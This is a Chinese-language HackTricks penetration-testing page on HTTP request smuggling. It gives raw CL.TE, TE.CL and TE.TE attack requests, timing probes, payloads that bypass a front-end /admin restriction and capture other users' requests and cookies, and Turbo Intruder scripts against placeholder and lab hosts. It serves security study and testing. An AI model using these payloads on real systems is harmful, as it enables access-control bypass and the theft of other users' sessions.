# HTTP 请求串行攻击 / HTTP Desync 攻击

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

- 如果您想看到您的**公司在 HackTricks 中被广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
- 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 什么是

当**前端代理**和**后端**服务器之间发生**不同步**时，会出现此漏洞，使得**攻击者**能够发送一个 HTTP **请求**，在**前端**代理（负载均衡/反向代理）中被**解释**为**单个请求**，而在**后端**服务器中被解释为**2个请求**。\
这使得用户能够在**后端服务器接收到的下一个请求**之后修改该请求。

### 理论

[**RFC 规范（2161）**](https://tools.ietf.org/html/rfc2616)

> 如果接收到同时具有传输编码头字段和内容长度头字段的消息，则必须忽略后者。

**Content-Length**

> Content-Length 实体头指示发送给接收方的实体主体的字节数。

**Transfer-Encoding: chunked**

> Transfer-Encoding 头指定用于安全传输有效载荷主体的编码形式。\
> Chunked 意味着大数据以一系列块的形式发送

### 现实情况

**前端**（负载均衡/反向代理）**处理** _**content-length**_ 或 _**transfer-encoding**_ 头，而**后端**服务器**处理另一个**头，导致这两个系统之间的**不同步**。\
这可能非常危险，因为**攻击者将能够向反向代理发送一个请求**，该请求将被**后端**服务器**解释为2个不同的请求**。这种技术的危险在于**后端**服务器将**解释****注入的第二个请求**，就好像它**来自下一个客户端**，而该客户端的**真实请求**将成为**注入请求**的一部分。

### 特殊情况

请记住，在 HTTP 中，**换行符由 2 个字节组成**：

- **Content-Length**：此头使用**十进制数**指示请求主体的**字节数**。预期请求主体在最后一个字符结束，**在请求末尾不需要换行符**。
- **Transfer-Encoding**：此头在**主体**中使用**十六进制数**指示**下一个块**的**字节数**。**块**必须以**换行符结束**，但此换行符**不计入**长度指示符。此传输方法必须以**大小为 0 的块后跟 2 个换行符**结束：`0`
- **Connection**：根据我的经验，建议在请求串行的第一个请求中使用**`Connection: keep-alive`**。

## 基本示例

因此，请求串行攻击涉及将`Content-Length`头和`Transfer-Encoding`头放入单个 HTTP 请求中，并操纵这些头，使得前端和后端服务器对请求进行不同处理。具体操作方式取决于两个服务器的行为：

- **CL.TE**：前端服务器使用`Content-Length`头，后端服务器使用`Transfer-Encoding`头。
- **TE.CL**：前端服务器使用`Transfer-Encoding`头，后端服务器使用`Content-Length`头。
- **TE.TE**：前端和后端服务器都支持`Transfer-Encoding`头，但可以通过某种方式使其中一个服务器不处理它。

### CL.TE 漏洞

在这里，**前端**服务器使用**`Content-Length`**头，**后端**服务器使用**`Transfer-Encoding`**头。我们可以执行简单的 HTTP 请求串行攻击，如下所示：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

请注意，`Content-Length`指示**请求主体长度为 30 字节**（_请记住 HTTP 使用换行符，每个换行符占 2 个字节_），因此反向代理**将发送完整请求**到后端，并且后端将处理`Transfer-Encoding`头，将`GET /404 HTTP/1.1`留作**下一个请求的开头**（顺便说一句，下一个请求将附加到`Foo:x<下一个请求从这里开始>`）。

### TE.CL 漏洞

在这里，前端服务器使用`Transfer-Encoding`头，后端服务器使用`Content-Length`头。我们可以执行简单的 HTTP 请求串行攻击，如下所示：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

在这种情况下，**反向代理**将**发送整个请求**到**后端**，因为**`Transfer-encoding`**指示如此。但是，**后端**将仅处理**`7b`**（4 字节），如`Content-Length`所示。因此，下一个请求将是以`GET /404 HTTP/1.1`开头的请求。

_请注意，即使攻击必须以`0`结尾，下一个请求也将附加为**x**参数的额外值。_\
_还请注意，嵌入请求的 Content-Length 将指示将附加到**x**参数的下一个请求的长度。如果太小，将只附加几个字节，如果太大（大于下一个请求的长度），将为下一个请求抛出错误。_

### TE.TE 漏洞

在这里，前端和后端服务器都支持`Transfer-Encoding`头，但其中一个服务器可以通过某种方式诱使不处理它。\
可以通过各种方式混淆`Transfer-Encoding`头。例如：

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

根据**停止处理**TE 头的服务器（反向代理或后端），您将找到**CL.TE 漏洞**或**TE.CL 漏洞**。

## 查找 HTTP 请求串行攻击

### 使用定时技术查找 CL.TE 漏洞

如果应用程序容易受到请求串行攻击的 CL.TE 变体影响，则发送以下请求通常会导致时间延迟：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
由于前端服务器使用`Content-Length`头，它将仅转发此请求的一部分，省略`0`。后端服务器使用`Transfer-Encoding`头，处理第一个块，然后等待下一个块到达。这将导致可观察到的时间延迟。

有时，您不会收到超时，而是从最终主机收到400错误请求，就像在以下场景中发送CL.TE有效负载时一样：

![](<../../.gitbook/assets/image (444).png>)

响应是一个重定向，其中包含主体内的错误，甚至包括使用的haproxy版本：

![](<../../.gitbook/assets/image (443).png>)

### 使用时间技术查找TE.CL漏洞

如果应用程序容易受到请求走私的TE.CL变体的影响，那么发送类似以下请求通常会导致时间延迟：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### 探测 HTTP 请求串行漏洞

一旦您发现**时间技术有效**，您需要**探测**您是否可以**篡改其他客户端请求**。\
最简单的方法是尝试操纵自己的请求，例如**请求`/`返回404**。\
在[基本示例](./#basic-examples)中，我们已经看到了如何使用`CL.TE`和`TE.CL`示例来操纵客户端请求以请求`/404`，从而在客户端请求任何其他资源时引发404响应。

**注意事项**

在尝试通过干扰其他请求来确认请求串行漏洞时，应牢记以下重要考虑事项：

* “攻击”请求和“正常”请求应通过不同的网络连接发送到服务器。通过同一连接发送两个请求无法证明漏洞存在。
* “攻击”请求和“正常”请求应尽可能使用相同的 URL 和参数名称。这是因为许多现代应用程序根据 URL 和参数将前端请求路由到不同的后端服务器。使用相同的 URL 和参数增加了请求将由同一后端服务器处理的机会，这对攻击至关重要。
* 在测试“正常”请求以检测来自“攻击”请求的任何干扰时，您将与应用程序同时接收的任何其他请求（包括其他用户的请求）竞争。您应该在“攻击”请求之后立即发送“正常”请求。如果应用程序很忙，您可能需要多次尝试才能确认漏洞。
* 在某些应用程序中，前端服务器充当负载均衡器，并根据某些负载均衡算法将请求转发到不同的后端系统。如果您的“攻击”和“正常”请求被转发到不同的后端系统，则攻击将失败。这是您可能需要多次尝试才能确认漏洞的另一个原因。
* 如果您的攻击成功干扰了后续请求，但这不是您发送的“正常”请求以检测干扰的请求，则意味着另一个应用程序用户受到了您的攻击影响。如果您继续执行测试，这可能会对其他用户产生破坏性影响，因此您应该谨慎行事。

### 通过逐跳头强制

滥用逐跳头，您可以指示代理**删除标头 Content-Length 或 Transfer-Encoding 以便滥用 HTTP 请求串行漏洞**。
```
Connection: Content-Length
```
## 滥用HTTP请求串联

### 用于绕过前端安全控制

有时**前端代理会执行一些安全检查**。您可以通过滥用HTTP请求串联来**绕过这些保护措施**。例如，在这个例子中，您**无法从外部访问`/admin`**，而前端代理正在检查，但是这个**代理没有检查嵌入的请求**：

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### 揭示前端请求重写 <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

在许多应用程序中，**前端服务器在将请求转发到后端服务器之前执行一些请求重写**，通常是通过添加一些额外的请求标头。\
一种常见的做法是**在请求中添加标头** `X-Forwarded-For: <客户端的IP>` 或类似的标头，以便后端知道客户端的IP。\
有时，如果您能**找到附加到请求的新值**，您可能能够**绕过保护措施**并**访问隐藏的信息**/**端点**。

要发现代理如何重写请求，您需要**找到后端将反映其值的POST参数**。然后，将此参数放在最后一个位置，并使用类似于以下示例的利用：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

在这种情况下，下一个请求将附加在`search=`之后，这也是**将在响应中反映其值的参数**，因此它将**反映下一个请求的标头**。

请注意，**仅会反映嵌入请求的`Content-Length`标头中指示的长度**。如果使用较小的数字，只会反映少量字节，如果使用比所有标头长度更大的数字，则嵌入请求将引发错误。因此，您应该**从一个小数字开始**，然后**逐渐增加**，直到看到您想要看到的所有内容。\
还要注意，**此技术也可利用TE.CL**漏洞，但请求必须以`search=\r\n0`结尾。但是，无论新行字符如何，值都将附加到搜索参数。

最后请注意，在此攻击中，我们仍在攻击自己以了解前端代理如何重写请求。

### 捕获其他用户的请求 <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

如果您能找到一个将保存某个参数内容的POST请求，您可以将以下请求附加为该参数的值，以便存储下一个客户端的请求：

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

在这种情况下，**参数comment**的值将被**保存在页面上一个公开可见的帖子的评论**中，因此将显示一个带有下一个请求内容的评论。

_这种技术的一个限制是通常只能捕获直到适用于串联请求的参数分隔符的数据。对于URL编码的表单提交，这将是`&`字符，这意味着从受害用户请求中存储的内容将在第一个`&`处结束，甚至可能出现在查询字符串中。_

还要注意，**此技术也可利用TE.CL**漏洞，但请求必须以`search=\r\n0`结尾。但是，无论新行字符如何，值都将附加到搜索参数。
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## 更多信息

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[这里查看图片。](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## 工具

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): 这个工具是基于语法的HTTP Fuzzer，用于发现奇怪的请求欺骗差异。

## 参考

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
